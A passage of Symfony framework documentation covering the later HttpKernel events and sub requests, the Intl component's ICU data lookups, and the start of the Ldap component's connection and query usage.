into a ``Response``

:ref:`Kernel Events Information Table <component-http-kernel-event-table>`

If the controller doesn't return a ``Response`` object, then the kernel dispatches
another event - ``kernel.view``. The job of a listener to this event is to
use the return value of the controller (e.g. an array of data or an object)
to create a ``Response``.

This can be useful if you want to use a "view" layer: instead of returning
a ``Response`` from the controller, you return data that represents the page.
A listener to this event could then use this data to create a ``Response`` that
is in the correct format (e.g HTML, JSON, etc).

At this stage, if no listener sets a response on the event, then an exception
is thrown: either the controller *or* one of the view listeners must always
return a ``Response``.

.. note::

    When setting a response for the ``kernel.view`` event, the propagation
    is stopped. This means listeners with lower priority won't be executed.

.. sidebar:: ``kernel.view`` in the Symfony Framework

    There is a default listener inside the Symfony Framework for the ``kernel.view``
    event. If your controller action returns an array, and you apply the
    :ref:`#[Template()] attribute <templates-template-attribute>` to that
    controller action, then this listener renders a template, passes the array
    you returned from your controller to that template, and creates a ``Response``
    containing the returned content from that template.

    Additionally, a popular community bundle `FOSRestBundle`_ implements
    a listener on this event which aims to give you a robust view layer
    capable of using a single controller to return many different content-type
    responses (e.g. HTML, JSON, XML, etc).

.. _component-http-kernel-kernel-response:

7) The ``kernel.response`` Event
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Typical Purposes**: Modify the ``Response`` object just before it is sent

:ref:`Kernel Events Information Table <component-http-kernel-event-table>`

The end goal of the kernel is to transform a ``Request`` into a ``Response``. The
``Response`` might be created during the :ref:`kernel.request <component-http-kernel-kernel-request>`
event, returned from the :ref:`controller <component-http-kernel-calling-controller>`,
or returned by one of the listeners to the :ref:`kernel.view <component-http-kernel-kernel-view>`
event.

Regardless of who creates the ``Response``, another event - ``kernel.response``
is dispatched directly afterwards. A typical listener to this event will modify
the ``Response`` object in some way, such as modifying headers, adding cookies,
or even changing the content of the ``Response`` itself (e.g. injecting some
JavaScript before the end ``</body>`` tag of an HTML response).

After this event is dispatched, the final ``Response`` object is returned
from :method:`Symfony\\Component\\HttpKernel\\HttpKernel::handle`. In the
most typical use-case, you can then call the :method:`Symfony\\Component\\HttpFoundation\\Response::send`
method, which sends the headers and prints the ``Response`` content.

.. sidebar:: ``kernel.response`` in the Symfony Framework

    There are several minor listeners on this event inside the Symfony Framework,
    and most modify the response in some way. For example, the
    :class:`Symfony\\Bundle\\WebProfilerBundle\\EventListener\\WebDebugToolbarListener`
    injects some JavaScript at the bottom of your page in the ``dev`` environment
    which causes the web debug toolbar to be displayed. Another listener,
    :class:`Symfony\\Component\\Security\\Http\\Firewall\\ContextListener`
    serializes the current user's information into the
    session so that it can be reloaded on the next request.

.. _component-http-kernel-kernel-terminate:

8) The ``kernel.terminate`` Event
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Typical Purposes**: To perform some "heavy" action after the response has
been streamed to the user

:ref:`Kernel Events Information Table <component-http-kernel-event-table>`

The final event of the HttpKernel process is ``kernel.terminate`` and is unique
because it occurs *after* the ``HttpKernel::handle()`` method, and after the
response is sent to the user. Recall from above, then the code that uses
the kernel, ends like this::

    // sends the headers and echoes the content
    $response->send();

    // triggers the kernel.terminate event
    $kernel->terminate($request, $response);

As you can see, by calling ``$kernel->terminate`` after sending the response,
you will trigger the ``kernel.terminate`` event where you can perform certain
actions that you may have delayed in order to return the response as quickly
as possible to the client (e.g. sending emails).

.. caution::

    Internally, the HttpKernel makes use of the :phpfunction:`fastcgi_finish_request`
    PHP function. This means that at the moment, only the `PHP FPM`_ server
    API is able to send a response to the client while the server's PHP process
    still performs some tasks. With all other server APIs, listeners to ``kernel.terminate``
    are still executed, but the response is not sent to the client until they
    are all completed.

.. note::

    Using the ``kernel.terminate`` event is optional, and should only be
    called if your kernel implements :class:`Symfony\\Component\\HttpKernel\\TerminableInterface`.

.. _component-http-kernel-kernel-exception:

9) Handling Exceptions: the ``kernel.exception`` Event
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Typical Purposes**: Handle some type of exception and create an appropriate
``Response`` to return for the exception

:ref:`Kernel Events Information Table <component-http-kernel-event-table>`

If an exception is thrown at any point inside ``HttpKernel::handle()``, another
event - ``kernel.exception`` is dispatched. Internally, the body of the ``handle()``
method is wrapped in a try-catch block. When any exception is thrown, the
``kernel.exception`` event is dispatched so that your system can somehow respond
to the exception.

.. raw:: html

    <object data="../_images/components/http_kernel/http-workflow-exception.svg" type="image/svg+xml"
        alt="The HTTP KErnel flow diagram showing how exceptions bypass all further steps and are directly transformed to responses."
    ></object>

Each listener to this event is passed a :class:`Symfony\\Component\\HttpKernel\\Event\\ExceptionEvent`
object, which you can use to access the original exception via the
:method:`Symfony\\Component\\HttpKernel\\Event\\ExceptionEvent::getThrowable`
method. A typical listener on this event will check for a certain type of
exception and create an appropriate error ``Response``.

For example, to generate a 404 page, you might throw a special type of exception
and then add a listener on this event that looks for this exception and
creates and returns a 404 ``Response``. In fact, the HttpKernel component
comes with an :class:`Symfony\\Component\\HttpKernel\\EventListener\\ErrorListener`,
which if you choose to use, will do this and more by default (see the sidebar
below for more details).

The :class:`Symfony\\Component\\HttpKernel\\Event\\ExceptionEvent` exposes the
:method:`Symfony\\Component\\HttpKernel\\Event\\ExceptionEvent::isKernelTerminating`
method, which you can use to determine if the kernel is currently terminating
at the moment the exception was thrown.

.. versionadded:: 7.1

    The
    :method:`Symfony\\Component\\HttpKernel\\Event\\ExceptionEvent::isKernelTerminating`
    method was introduced in Symfony 7.1.

.. note::

    When setting a response for the ``kernel.exception`` event, the propagation
    is stopped. This means listeners with lower priority won't be executed.

.. sidebar:: ``kernel.exception`` in the Symfony Framework

    There are two main listeners to ``kernel.exception`` when using the
    Symfony Framework.

    **ErrorListener in the HttpKernel Component**

    The first comes core to the HttpKernel component
    and is called :class:`Symfony\\Component\\HttpKernel\\EventListener\\ErrorListener`.
    The listener has several goals:

    1) The thrown exception is converted into a
       :class:`Symfony\\Component\\ErrorHandler\\Exception\\FlattenException`
       object, which contains all the information about the request, but which
       can be printed and serialized.

    2) If the original exception implements
       :class:`Symfony\\Component\\HttpKernel\\Exception\\HttpExceptionInterface`,
       then ``getStatusCode()`` and ``getHeaders()`` are called on the exception
       and used to populate the headers and status code of the ``FlattenException``
       object. The idea is that these are used in the next step when creating
       the final response. If you want to set custom HTTP headers, you can always
       use the ``setHeaders()`` method on exceptions derived from the
       :class:`Symfony\\Component\\HttpKernel\\Exception\\HttpException` class.

    3) If the original exception implements
       :class:`Symfony\\Component\\HttpFoundation\\Exception\\RequestExceptionInterface`,
       then the status code of the ``FlattenException`` object is populated with
       ``400`` and no other headers are modified.

    4) A controller is executed and passed the flattened exception. The exact
       controller to render is passed as a constructor argument to this listener.
       This controller will return the final ``Response`` for this error page.

    **ExceptionListener in the Security Component**

    The other important listener is the
    :class:`Symfony\\Component\\Security\\Http\\Firewall\\ExceptionListener`.
    The goal of this listener is to handle security exceptions and, when
    appropriate, *help* the user to authenticate (e.g. redirect to the login
    page).

.. _http-kernel-creating-listener:

Creating an Event Listener
--------------------------

As you've seen, you can create and attach event listeners to any of the events
dispatched during the ``HttpKernel::handle()`` cycle. Typically a listener is a PHP
class with a method that's executed, but it can be anything. For more information
on creating and attaching event listeners, see :doc:`/components/event_dispatcher`.

The name of each of the "kernel" events is defined as a constant on the
:class:`Symfony\\Component\\HttpKernel\\KernelEvents` class. Additionally, each
event listener is passed a single argument, which is some subclass of :class:`Symfony\\Component\\HttpKernel\\Event\\KernelEvent`.
This object contains information about the current state of the system and
each event has their own event object:

.. _component-http-kernel-event-table:

===========================  ======================================  ========================================================================
Name                         ``KernelEvents`` Constant               Argument passed to the listener
===========================  ======================================  ========================================================================
kernel.request               ``KernelEvents::REQUEST``               :class:`Symfony\\Component\\HttpKernel\\Event\\RequestEvent`
kernel.controller            ``KernelEvents::CONTROLLER``            :class:`Symfony\\Component\\HttpKernel\\Event\\ControllerEvent`
kernel.controller_arguments  ``KernelEvents::CONTROLLER_ARGUMENTS``  :class:`Symfony\\Component\\HttpKernel\\Event\\ControllerArgumentsEvent`
kernel.view                  ``KernelEvents::VIEW``                  :class:`Symfony\\Component\\HttpKernel\\Event\\ViewEvent`
kernel.response              ``KernelEvents::RESPONSE``              :class:`Symfony\\Component\\HttpKernel\\Event\\ResponseEvent`
kernel.finish_request        ``KernelEvents::FINISH_REQUEST``        :class:`Symfony\\Component\\HttpKernel\\Event\\FinishRequestEvent`
kernel.terminate             ``KernelEvents::TERMINATE``             :class:`Symfony\\Component\\HttpKernel\\Event\\TerminateEvent`
kernel.exception             ``KernelEvents::EXCEPTION``             :class:`Symfony\\Component\\HttpKernel\\Event\\ExceptionEvent`
===========================  ======================================  ========================================================================

.. _http-kernel-working-example:

A full Working Example
----------------------

When using the HttpKernel component, you're free to attach any listeners
to the core events, use any controller resolver that implements the
:class:`Symfony\\Component\\HttpKernel\\Controller\\ControllerResolverInterface` and
use any argument resolver that implements the
:class:`Symfony\\Component\\HttpKernel\\Controller\\ArgumentResolverInterface`.
However, the HttpKernel component comes with some built-in listeners and everything
else that can be used to create a working example::

    use Symfony\Component\EventDispatcher\EventDispatcher;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\RequestStack;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel\Controller\ArgumentResolver;
    use Symfony\Component\HttpKernel\Controller\ControllerResolver;
    use Symfony\Component\HttpKernel\EventListener\RouterListener;
    use Symfony\Component\HttpKernel\HttpKernel;
    use Symfony\Component\Routing\Matcher\UrlMatcher;
    use Symfony\Component\Routing\RequestContext;
    use Symfony\Component\Routing\Route;
    use Symfony\Component\Routing\RouteCollection;

    $routes = new RouteCollection();
    $routes->add('hello', new Route('/hello/{name}', [
        '_controller' => function (Request $request): Response {
            return new Response(
                sprintf("Hello %s", $request->get('name'))
            );
        }]
    ));

    $request = Request::createFromGlobals();

    $matcher = new UrlMatcher($routes, new RequestContext());

    $dispatcher = new EventDispatcher();
    $dispatcher->addSubscriber(new RouterListener($matcher, new RequestStack()));

    $controllerResolver = new ControllerResolver();
    $argumentResolver = new ArgumentResolver();

    $kernel = new HttpKernel($dispatcher, $controllerResolver, new RequestStack(), $argumentResolver);

    $response = $kernel->handle($request);
    $response->send();

    $kernel->terminate($request, $response);

.. _http-kernel-sub-requests:

Sub Requests
------------

In addition to the "main" request that's sent into ``HttpKernel::handle()``,
you can also send a so-called "sub request". A sub request looks and acts like
any other request, but typically serves to render just one small portion of
a page instead of a full page. You'll most commonly make sub-requests from
your controller (or perhaps from inside a template, that's being rendered by
your controller).

.. raw:: html

    <object data="../_images/components/http_kernel/http-workflow-subrequest.svg" type="image/svg+xml"
        alt="The HTTP Kernel flow diagram with a sub request from a controller starting the lifecycle at step 1 again and feeding the sub Response content back into the controller."
    ></object>

To execute a sub request, use ``HttpKernel::handle()``, but change the second
argument as follows::

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpKernel\HttpKernelInterface;

    // ...

    // create some other request manually as needed
    $request = new Request();
    // for example, possibly set its _controller manually
    $request->attributes->set('_controller', '...');

    $response = $kernel->handle($request, HttpKernelInterface::SUB_REQUEST);
    // do something with this response

This creates another full request-response cycle where this new ``Request`` is
transformed into a ``Response``. The only difference internally is that some
listeners (e.g. security) may only act upon the main request. Each listener
is passed some subclass of :class:`Symfony\\Component\\HttpKernel\\Event\\KernelEvent`,
whose :method:`Symfony\\Component\\HttpKernel\\Event\\KernelEvent::isMainRequest`
method can be used to check if the current request is a "main" or "sub" request.

For example, a listener that only needs to act on the main request may
look like this::

    use Symfony\Component\HttpKernel\Event\RequestEvent;
    // ...

    public function onKernelRequest(RequestEvent $event): void
    {
        if (!$event->isMainRequest()) {
            return;
        }

        // ...
    }

.. note::

    The default value of the ``_format`` request attribute is ``html``. If your
    sub request returns a different format (e.g. ``json``) you can set it by
    defining the ``_format`` attribute explicitly on the request::

        $request->attributes->set('_format', 'json');

.. _http-kernel-resource-locator:

Locating Resources
------------------

The HttpKernel component is responsible of the bundle mechanism used in Symfony
applications. One of the key features of the bundles is that you can use logic
paths instead of physical paths to refer to any of their resources (config files,
templates, controllers, translation files, etc.)

This allows to import resources even if you don't know where in the filesystem a
bundle will be installed. For example, the ``services.xml`` file stored in the
``Resources/config/`` directory of a bundle called FooBundle can be referenced as
``@FooBundle/Resources/config/services.xml`` instead of ``__DIR__/Resources/config/services.xml``.

This is possible thanks to the :method:`Symfony\\Component\\HttpKernel\\Kernel::locateResource`
method provided by the kernel, which transforms logical paths into physical paths::

    $path = $kernel->locateResource('@FooBundle/Resources/config/services.xml');

Learn more
----------

.. toctree::
   :maxdepth: 1
   :glob:

   /reference/events

.. _reflection: https://www.php.net/manual/en/book.reflection.php
.. _FOSRestBundle: https://github.com/friendsofsymfony/FOSRestBundle
.. _`PHP FPM`: https://www.php.net/manual/en/install.fpm.php
.. _variadic: https://www.php.net/manual/en/functions.arguments.php#functions.variable-arg-list
The Intl Component
==================

    This component provides access to the localization data of the `ICU library`_.

.. seealso::

    This article explains how to use the Intl features as an independent component
    in any PHP application. Read the :doc:`/translation` article to learn about
    how to internationalize and manage the user locale in Symfony applications.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/intl

.. include:: /components/require_autoload.rst.inc

Accessing ICU Data
------------------

This component provides the following ICU data:

* `Language and Script Names`_
* `Country Names`_
* `Locales`_
* `Currencies`_
* `Timezones`_

Language and Script Names
~~~~~~~~~~~~~~~~~~~~~~~~~

The :class:`Symfony\\Component\\Intl\\Languages` class provides access to the name of all languages
according to the `ISO 639-1 alpha-2`_ list and the `ISO 639-2 alpha-3 (2T)`_ list::

    use Symfony\Component\Intl\Languages;

    \Locale::setDefault('en');

    $languages = Languages::getNames();
    // ('languageCode' => 'languageName')
    // => ['ab' => 'Abkhazian', 'ace' => 'Achinese', ...]

    $languages = Languages::getAlpha3Names();
    // ('languageCode' => 'languageName')
    // => ['abk' => 'Abkhazian', 'ace' => 'Achinese', ...]

    $language = Languages::getName('fr');
    // => 'French'

    $language = Languages::getAlpha3Name('fra');
    // => 'French'

All methods accept the translation locale as the last, optional parameter,
which defaults to the current default locale::

    $languages = Languages::getNames('de');
    // => ['ab' => 'Abchasisch', 'ace' => 'Aceh', ...]

    $languages = Languages::getAlpha3Names('de');
    // => ['abk' => 'Abchasisch', 'ace' => 'Aceh', ...]

    $language = Languages::getName('fr', 'de');
    // => 'Französisch'

    $language = Languages::getAlpha3Name('fra', 'de');
    // => 'Französisch'

If the given locale doesn't exist, the methods trigger a
:class:`Symfony\\Component\\Intl\\Exception\\MissingResourceException`. In addition
to catching the exception, you can also check if a given language code is valid::

    $isValidLanguage = Languages::exists($languageCode);

Or if you have an alpha3 language code you want to check::

    $isValidLanguage = Languages::alpha3CodeExists($alpha3Code);

You may convert codes between two-letter alpha2 and three-letter alpha3 codes::

    $alpha3Code = Languages::getAlpha3Code($alpha2Code);

    $alpha2Code = Languages::getAlpha2Code($alpha3Code);

The :class:`Symfony\\Component\\Intl\\Scripts` class provides access to the optional four-letter script code
that can follow the language code according to the `Unicode ISO 15924 Registry`_
(e.g. ``HANS`` in ``zh_HANS`` for simplified Chinese and ``HANT`` in ``zh_HANT``
for traditional Chinese)::

    use Symfony\Component\Intl\Scripts;

    \Locale::setDefault('en');

    $scripts = Scripts::getNames();
    // ('scriptCode' => 'scriptName')
    // => ['Adlm' => 'Adlam', 'Afak' => 'Afaka', ...]

    $script = Scripts::getName('Hans');
    // => 'Simplified'

All methods accept the translation locale as the last, optional parameter,
which defaults to the current default locale::

    $scripts = Scripts::getNames('de');
    // => ['Adlm' => 'Adlam', 'Afak' => 'Afaka', ...]

    $script = Scripts::getName('Hans', 'de');
    // => 'Vereinfacht'

If the given script code doesn't exist, the methods trigger a
:class:`Symfony\\Component\\Intl\\Exception\\MissingResourceException`. In addition
to catching the exception, you can also check if a given script code is valid::

    $isValidScript = Scripts::exists($scriptCode);

Country Names
~~~~~~~~~~~~~

The :class:`Symfony\\Component\\Intl\\Countries` class provides access to the
name of all countries according to the `ISO 3166-1 alpha-2`_ list and the
`ISO 3166-1 alpha-3`_ list of officially recognized countries and territories::

    use Symfony\Component\Intl\Countries;

    \Locale::setDefault('en');

    $countries = Countries::getNames();
    // ('alpha2Code' => 'countryName')
    // => ['AF' => 'Afghanistan', 'AX' => 'Åland Islands', ...]

    $countries = Countries::getAlpha3Names();
    // ('alpha3Code' => 'countryName')
    // => ['AFG' => 'Afghanistan', 'ALA' => 'Åland Islands', ...]

    $country = Countries::getName('GB');
    // => 'United Kingdom'

    $country = Countries::getAlpha3Name('NOR');
    // => 'Norway'

All methods accept the translation locale as the last, optional parameter,
which defaults to the current default locale::

    $countries = Countries::getNames('de');
    // => ['AF' => 'Afghanistan', 'EG' => 'Ägypten', ...]

    $countries = Countries::getAlpha3Names('de');
    // => ['AFG' => 'Afghanistan', 'EGY' => 'Ägypten', ...]

    $country = Countries::getName('GB', 'de');
    // => 'Vereinigtes Königreich'

    $country = Countries::getAlpha3Name('GBR', 'de');
    // => 'Vereinigtes Königreich'

If the given country code doesn't exist, the methods trigger a
:class:`Symfony\\Component\\Intl\\Exception\\MissingResourceException`. In addition
to catching the exception, you can also check if a given country code is valid::

    $isValidCountry = Countries::exists($alpha2Code);

Or if you have an alpha3 country code you want to check::

    $isValidCountry = Countries::alpha3CodeExists($alpha3Code);

You may convert codes between two-letter alpha2 and three-letter alpha3 codes::

    $alpha3Code = Countries::getAlpha3Code($alpha2Code);

    $alpha2Code = Countries::getAlpha2Code($alpha3Code);

Numeric Country Codes
~~~~~~~~~~~~~~~~~~~~~

The `ISO 3166-1 numeric`_ standard defines three-digit country codes to represent
countries, dependent territories, and special areas of geographical interest.

The main advantage over the ISO 3166-1 alphabetic codes (alpha-2 and alpha-3) is
that these numeric codes are independent from the writing system. The alphabetic
codes use the 26-letter English alphabet, which might be unavailable or difficult
to use for people and systems using non-Latin scripts (e.g. Arabic or Japanese).

The :class:`Symfony\\Component\\Intl\\Countries` class provides access to these
numeric country codes::

    use Symfony\Component\Intl\Countries;

    \Locale::setDefault('en');

    $numericCodes = Countries::getNumericCodes();
    // ('alpha2Code' => 'numericCode')
    // => ['AA' => '958', 'AD' => '020', ...]

    $numericCode = Countries::getNumericCode('FR');
    // => '250'

    $alpha2 = Countries::getAlpha2FromNumeric('250');
    // => 'FR'

    $exists = Countries::numericCodeExists('250');
    // => true

Locales
~~~~~~~

A locale is the combination of a language, a region and some parameters that
define the interface preferences of the user. For example, "Chinese" is the
language and ``zh_Hans_MO`` is the locale for "Chinese" (language) + "Simplified"
(script) + "Macau SAR China" (region). The :class:`Symfony\\Component\\Intl\\Locales`
class provides access to the name of all locales::

    use Symfony\Component\Intl\Locales;

    \Locale::setDefault('en');

    $locales = Locales::getNames();
    // ('localeCode' => 'localeName')
    // => ['af' => 'Afrikaans', 'af_NA' => 'Afrikaans (Namibia)', ...]

    $locale = Locales::getName('zh_Hans_MO');
    // => 'Chinese (Simplified, Macau SAR China)'

All methods accept the translation locale as the last, optional parameter,
which defaults to the current default locale::

    $locales = Locales::getNames('de');
    // => ['af' => 'Afrikaans', 'af_NA' => 'Afrikaans (Namibia)', ...]

    $locale = Locales::getName('zh_Hans_MO', 'de');
    // => 'Chinesisch (Vereinfacht, Sonderverwaltungsregion Macau)'

If the given locale code doesn't exist, the methods trigger a
:class:`Symfony\\Component\\Intl\\Exception\\MissingResourceException`. In addition
to catching the exception, you can also check if a given locale code is valid::

    $isValidLocale = Locales::exists($localeCode);

Currencies
~~~~~~~~~~

The :class:`Symfony\\Component\\Intl\\Currencies` class provides access to the name
of all currencies as well as some of their information (symbol, fraction digits, etc.)::

    use Symfony\Component\Intl\Currencies;

    \Locale::setDefault('en');

    $currencies = Currencies::getNames();
    // ('currencyCode' => 'currencyName')
    // => ['AFN' => 'Afghan Afghani', 'ALL' => 'Albanian Lek', ...]

    $currency = Currencies::getName('INR');
    // => 'Indian Rupee'

    $symbol = Currencies::getSymbol('INR');
    // => '₹'

The fraction digits methods return the number of decimal digits to display when
formatting numbers with this currency. Depending on the currency, this value
can change if the number is used in cash transactions or in other scenarios
(e.g. accounting)::

    // Indian rupee defines the same value for both
    $fractionDigits = Currencies::getFractionDigits('INR');         // returns: 2
    $cashFractionDigits = Currencies::getCashFractionDigits('INR'); // returns: 2

    // Swedish krona defines different values
    $fractionDigits = Currencies::getFractionDigits('SEK');         // returns: 2
    $cashFractionDigits = Currencies::getCashFractionDigits('SEK'); // returns: 0

Some currencies require to round numbers to the nearest increment of some value
(e.g. 5 cents). This increment might be different if numbers are formatted for
cash transactions or other scenarios (e.g. accounting)::

    // Indian rupee defines the same value for both
    $roundingIncrement = Currencies::getRoundingIncrement('INR');         // returns: 0
    $cashRoundingIncrement = Currencies::getCashRoundingIncrement('INR'); // returns: 0

    // Canadian dollar defines different values because they have eliminated
    // the smaller coins (1-cent and 2-cent) and prices in cash must be rounded to
    // 5 cents (e.g. if price is 7.42 you pay 7.40; if price is 7.48 you pay 7.50)
    $roundingIncrement = Currencies::getRoundingIncrement('CAD');         // returns: 0
    $cashRoundingIncrement = Currencies::getCashRoundingIncrement('CAD'); // returns: 5

All methods (except for ``getFractionDigits()``, ``getCashFractionDigits()``,
``getRoundingIncrement()`` and ``getCashRoundingIncrement()``) accept the
translation locale as the last, optional parameter, which defaults to the
current default locale::

    $currencies = Currencies::getNames('de');
    // => ['AFN' => 'Afghanischer Afghani', 'EGP' => 'Ägyptisches Pfund', ...]

    $currency = Currencies::getName('INR', 'de');
    // => 'Indische Rupie'

If the given currency code doesn't exist, the methods trigger a
:class:`Symfony\\Component\\Intl\\Exception\\MissingResourceException`. In addition
to catching the exception, you can also check if a given currency code is valid::

    $isValidCurrency = Currencies::exists($currencyCode);

.. _component-intl-timezones:

Timezones
~~~~~~~~~

The :class:`Symfony\\Component\\Intl\\Timezones` class provides several utilities
related to timezones. First, you can get the name and values of all timezones in
all languages::

    use Symfony\Component\Intl\Timezones;

    \Locale::setDefault('en');

    $timezones = Timezones::getNames();
    // ('timezoneID' => 'timezoneValue')
    // => ['America/Eirunepe' => 'Acre Time (Eirunepe)', 'America/Rio_Branco' => 'Acre Time (Rio Branco)', ...]

    $timezone = Timezones::getName('Africa/Nairobi');
    // => 'East Africa Time (Nairobi)'

All methods accept the translation locale as the last, optional parameter,
which defaults to the current default locale::

    $timezones = Timezones::getNames('de');
    // => ['America/Eirunepe' => 'Acre-Zeit (Eirunepe)', 'America/Rio_Branco' => 'Acre-Zeit (Rio Branco)', ...]

    $timezone = Timezones::getName('Africa/Nairobi', 'de');
    // => 'Ostafrikanische Zeit (Nairobi)'

You can also get all the timezones that exist in a given country. The
``forCountryCode()`` method returns one or more timezone IDs, which you can
translate into any locale with the ``getName()`` method shown earlier::

    // unlike language codes, country codes are always uppercase (CL = Chile)
    $timezones = Timezones::forCountryCode('CL');
    // => ['America/Punta_Arenas', 'America/Santiago', 'Pacific/Easter']

The reverse lookup is also possible thanks to the ``getCountryCode()`` method,
which returns the code of the country where the given timezone ID belongs to::

    $countryCode = Timezones::getCountryCode('America/Vancouver');
    // => $countryCode = 'CA' (CA = Canada)

The `UTC/GMT time offsets`_ of all timezones are provided by ``getRawOffset()``
(which returns an integer representing the offset in seconds) and
``getGmtOffset()`` (which returns a string representation of the offset to
display it to users)::

    $offset = Timezones::getRawOffset('Etc/UTC');              // $offset = 0
    $offset = Timezones::getRawOffset('America/Buenos_Aires'); // $offset = -10800
    $offset = Timezones::getRawOffset('Asia/Katmandu');        // $offset = 20700

    $offset = Timezones::getGmtOffset('Etc/UTC');              // $offset = 'GMT+00:00'
    $offset = Timezones::getGmtOffset('America/Buenos_Aires'); // $offset = 'GMT-03:00'
    $offset = Timezones::getGmtOffset('Asia/Katmandu');        // $offset = 'GMT+05:45'

The timezone offset can vary in time because of the `daylight saving time (DST)`_
practice. By default these methods use the ``time()`` PHP function to get the
current timezone offset value, but you can pass a timestamp as their second
arguments to get the offset at any given point in time::

    // In 2019, the DST period in Madrid (Spain) went from March 31 to October 27
    $offset = Timezones::getRawOffset('Europe/Madrid', strtotime('March 31, 2019'));   // $offset = 3600
    $offset = Timezones::getRawOffset('Europe/Madrid', strtotime('April 1, 2019'));    // $offset = 7200
    $offset = Timezones::getGmtOffset('Europe/Madrid', strtotime('October 27, 2019')); // $offset = 'GMT+02:00'
    $offset = Timezones::getGmtOffset('Europe/Madrid', strtotime('October 28, 2019')); // $offset = 'GMT+01:00'

The string representation of the GMT offset can vary depending on the locale, so
you can pass the locale as the third optional argument::

    $offset = Timezones::getGmtOffset('Europe/Madrid', strtotime('October 28, 2019'), 'ar'); // $offset = 'غرينتش+01:00'
    $offset = Timezones::getGmtOffset('Europe/Madrid', strtotime('October 28, 2019'), 'dz'); // $offset = 'ཇི་ཨེམ་ཏི་+01:00'

If the given timezone ID doesn't exist, the methods trigger a
:class:`Symfony\\Component\\Intl\\Exception\\MissingResourceException`. In addition
to catching the exception, you can also check if a given timezone ID is valid::

    $isValidTimezone = Timezones::exists($timezoneId);

.. _component-intl-emoji-transliteration:

Emoji Transliteration
~~~~~~~~~~~~~~~~~~~~~

Symfony provides utilities to translate emojis into their textual representation
in all languages. Read the documentation on :ref:`working with emojis in strings <string-emoji-transliteration>`
to learn more about this feature.

Disk Space
----------

If you need to save disk space (e.g. because you deploy to some service with tight size
constraints), run this command (e.g. as an automated script after ``composer install``) to compress the
internal Symfony Intl data files using the PHP ``zlib`` extension:

.. code-block:: terminal

    # adjust the path to the 'compress' binary based on your application installation
    $ php ./vendor/symfony/intl/Resources/bin/compress

Learn more
----------

.. toctree::
    :maxdepth: 1
    :glob:

    /reference/forms/types/country
    /reference/forms/types/currency
    /reference/forms/types/language
    /reference/forms/types/locale
    /reference/forms/types/timezone

.. _ICU library: https://icu.unicode.org/
.. _`Unicode ISO 15924 Registry`: https://www.unicode.org/iso15924/iso15924-codes.html
.. _`ISO 3166-1 alpha-2`: https://en.wikipedia.org/wiki/ISO_3166-1_alpha-2
.. _`ISO 3166-1 alpha-3`: https://en.wikipedia.org/wiki/ISO_3166-1_alpha-3
.. _`ISO 3166-1 numeric`: https://en.wikipedia.org/wiki/ISO_3166-1_numeric
.. _`UTC/GMT time offsets`: https://en.wikipedia.org/wiki/List_of_UTC_time_offsets
.. _`daylight saving time (DST)`: https://en.wikipedia.org/wiki/Daylight_saving_time
.. _`ISO 639-1 alpha-2`: https://en.wikipedia.org/wiki/ISO_639-1
.. _`ISO 639-2 alpha-3 (2T)`: https://en.wikipedia.org/wiki/ISO_639-2
The Ldap Component
==================

    The Ldap component provides a means to connect to an LDAP server (OpenLDAP or Active Directory).

Installation
------------

.. code-block:: terminal

    $ composer require symfony/ldap

.. include:: /components/require_autoload.rst.inc

Usage
-----

The :class:`Symfony\\Component\\Ldap\\Ldap` class provides methods to authenticate
and query against an LDAP server.

The ``Ldap`` class uses an :class:`Symfony\\Component\\Ldap\\Adapter\\AdapterInterface`
to communicate with an LDAP server. The :class:`adapter <Symfony\\Component\\Ldap\\Adapter\\ExtLdap\\Adapter>`
for PHP's built-in LDAP extension, for example, can be configured using the
following options:

``host``
    IP or hostname of the LDAP server

``port``
    Port used to access the LDAP server

``version``
    The version of the LDAP protocol to use

``encryption``
    The encryption protocol: ``ssl``, ``tls`` or ``none`` (default)

``connection_string``
    You may use this option instead of ``host`` and ``port`` to connect to the
    LDAP server

``optReferrals``
    Specifies whether to automatically follow referrals returned by the LDAP server

``options``
    LDAP server's options as defined in
    :class:`ConnectionOptions <Symfony\\Component\\Ldap\\Adapter\\ExtLdap\\ConnectionOptions>`

For example, to connect to a start-TLS secured LDAP server::

    use Symfony\Component\Ldap\Ldap;

    $ldap = Ldap::create('ext_ldap', [
        'host' => 'my-server',
        'encryption' => 'ssl',
    ]);

Or you could directly specify a connection string::

    use Symfony\Component\Ldap\Ldap;

    $ldap = Ldap::create('ext_ldap', ['connection_string' => 'ldaps://my-server:636']);

The :method:`Symfony\\Component\\Ldap\\Ldap::bind` method
authenticates a previously configured connection using both the
distinguished name (DN) and the password of a user::

    use Symfony\Component\Ldap\Ldap;
    // ...

    $ldap->bind($dn, $password);

.. caution::

    When the LDAP server allows unauthenticated binds, a blank password will always be valid.

Once bound (or if you enabled anonymous authentication on your
LDAP server), you may query the LDAP server using the
:method:`Symfony\\Component\\Ldap\\Ldap::query` method::

    use Symfony\Component\Ldap\Ldap;
    // ...

    $query = $ldap->query('dc=symfony,dc=com', '(&(objectclass=person)(ou=Maintainers))');
    $results = $query->execute();

    foreach ($results as $entry) {
        // Do something with the results
    }

By default, LDAP entries are lazy-loaded. If you wish to fetch
all entries in a single call and do something with the results'
array, you may use the
:method:`Symfony\\Component\\Ldap\\Adapter\\ExtLdap\\Collection::toArray` method::

    use Symfony\Component\Ldap\Ldap;
    // ...

    $query = $ldap->query('dc=symfony,dc=com', '(&(objectclass=person)(ou=Maintainers))');
    $results = $query->execute()->toArray();

    // Do something with the results array

By default, LDAP queries use the ``Symfony\Component\Ldap\Adapter\QueryInterface::SCOPE_SUB``
scope, which corresponds to the ``LDAP_SCOPE_SUBTREE`` scope of the
:phpfunction:`ldap_search` function. You can also use ``SCOPE_BASE`` (related
to the ``LDAP_SCOPE_BASE`` scope of :phpfunction:`ldap_read`) and ``SCOPE_ONE``
(related to the ``LDAP_SCOPE_ONELEVEL`` scope of :phpfunction:`ldap_list`)::

    use Symfony\Component\Ldap\Adapter\QueryInterface;

    $query = $ldap->query('dc=symfony,dc=com', '...', ['scope' => QueryInterface::SCOPE_ONE]);

Use the ``filter`` option to only retrieve some specific attributes:

    $query = $ldap->query('dc=symfony,dc=com', '...', ['filter' => ['cn', 'mail']);

